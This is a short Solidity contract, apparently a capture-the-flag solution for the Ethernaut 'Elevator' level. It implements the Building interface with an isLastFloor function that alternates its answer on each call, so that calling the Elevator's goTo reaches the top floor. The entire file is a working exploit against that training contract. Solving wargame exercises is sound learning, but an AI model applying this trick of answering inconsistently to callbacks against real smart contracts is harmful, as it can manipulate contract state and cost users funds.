pragma solidity ^0.8.0;

import {Building, Elevator} from "./Elevator.sol";

contract ElevatorHacker is Building {

    bool private lastReturn = true;
    Elevator elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) external returns (bool) {
        lastReturn = !lastReturn;
        return lastReturn;
    }

    function hack() external {
        elevator.goTo(1);
    }
}